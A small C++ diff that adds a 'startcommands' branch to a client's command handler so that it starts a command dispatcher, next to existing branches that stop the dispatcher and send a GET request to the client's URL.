@@ -137,6 +137,10 @@ private:
                 {
                     client_.commandDispatcher->keepCommandDispatcherRunning.store(false);
                 }
+                else if (command == "startcommands")
+                {
+                    client_.commandDispatcher->startCommandDispatcher();
+                }
                 else if (command == "get")
                 {
                     SendGetRequest(client_.url);
